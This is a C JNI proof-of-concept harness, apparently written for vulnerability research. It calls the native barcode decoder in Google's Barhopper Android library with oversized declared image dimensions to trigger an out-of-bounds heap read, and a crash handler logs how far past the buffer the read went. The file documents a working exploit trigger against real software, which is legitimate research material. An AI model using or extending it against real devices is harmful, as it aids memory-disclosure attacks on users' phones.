/*
 * bhdist.c — measure the OOB read distance in CalculateBlackPoints.
 *
 * Places the luminance buffer, records its address and length, then calls
 * recognizeBufferNative with declared geometry chosen so the decoder walks past the end.
 * The SIGSEGV handler reports (fault_addr - buffer_end) = how far past the end it read,
 * i.e. the attacker-influenced over-read length.
 */
#define _GNU_SOURCE 1
#include <jni.h>
#include <dlfcn.h>
#include <android/log.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>

#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR,"BHDIST",__VA_ARGS__)
typedef jobject (*fnbuf)(JNIEnv*,jclass,jint,jint,jobject,jobject);

static uintptr_t g_buf, g_end; static size_t g_len; static int g_dw,g_dh;
static void *g_base;

static void handler(int s,siginfo_t *si,void *uc){
    ucontext_t *c=(ucontext_t*)uc;
    unsigned long pc=(unsigned long)c->uc_mcontext.pc;
    long dist = (long)((uintptr_t)si->si_addr - g_end);
    long into = (long)((uintptr_t)si->si_addr - g_buf);
    char b[320];
    snprintf(b,sizeof b,
      "BHDIST sig=%d buf=%p end=%p len=%zu dw=%d dh=%d | fault=%p | past_end=%ld into_buf=%ld | off_in_lib=%#lx\n",
      s,(void*)g_buf,(void*)g_end,g_len,g_dw,g_dh,si->si_addr,dist,into,
      g_base?(pc-(unsigned long)g_base):0);
    __android_log_write(ANDROID_LOG_FATAL,"BHDIST",b);
    _exit(97);
}

JNIEXPORT jint JNICALL
Java_com_vrp_probe_BarhopperFuzz_nDist(JNIEnv *env,jclass cls,jstring so,jobject opts,
                                     jint dw,jint dh,jint bufsize,jint step){
    struct sigaction sa; memset(&sa,0,sizeof sa);
    sa.sa_sigaction=handler;sa.sa_flags=SA_SIGINFO;
    sigaction(SIGSEGV,&sa,NULL);sigaction(SIGBUS,&sa,NULL);
    const char *p=(*env)->GetStringUTFChars(env,so,0);
    void *L=dlopen(p,RTLD_NOW); if(!L){LOGE("dlopen %s",dlerror());return -1;}
    Dl_info di; g_base=0;
    { void*sym=dlsym(L,"Java_com_google_android_libraries_barhopper_Barhopper_parseRawValue");
      if(sym&&dladdr(sym,&di)) g_base=di.dli_fbase; }
    fnbuf r=(fnbuf)dlsym(L,"Java_com_google_android_libraries_barhopper_Barhopper_recognizeBufferNative");
    if(!r){LOGE("no buf sym");return -2;}

    g_dw=dw; g_dh=dh; g_len=(size_t)bufsize;
    /* exact-size heap array so we know precisely where the allocation ends */
    jbyteArray a=(*env)->NewByteArray(env,(jsize)bufsize);
    jbyte *e=(*env)->GetByteArrayElements(env,a,0);
    if(!e){LOGE("no elements");return -3;}
    for(size_t k=0;k<g_len;k++) e[k]=(jbyte)(k&0xFF);
    g_buf=(uintptr_t)e; g_end=g_buf+g_len;
    LOGE("BHDIST SETUP dw=%d dh=%d len=%zu step=%d buf=%#lx end=%#lx",dw,dh,g_len,step,(unsigned long)g_buf,(unsigned long)g_end);
    jobject res=r(env,cls,dw,dh,a,opts);
    if((*env)->ExceptionCheck(env))(*env)->ExceptionClear(env);
    LOGE("BHDIST NO-CRASH dw=%d dh=%d len=%zu (r=%p)",dw,dh,g_len,(void*)res);
    (*env)->ReleaseByteArrayElements(env,a,e,0);
    (*env)->DeleteLocalRef(env,a);
    (*env)->ReleaseStringUTFChars(env,so,p);
    return 0;
}
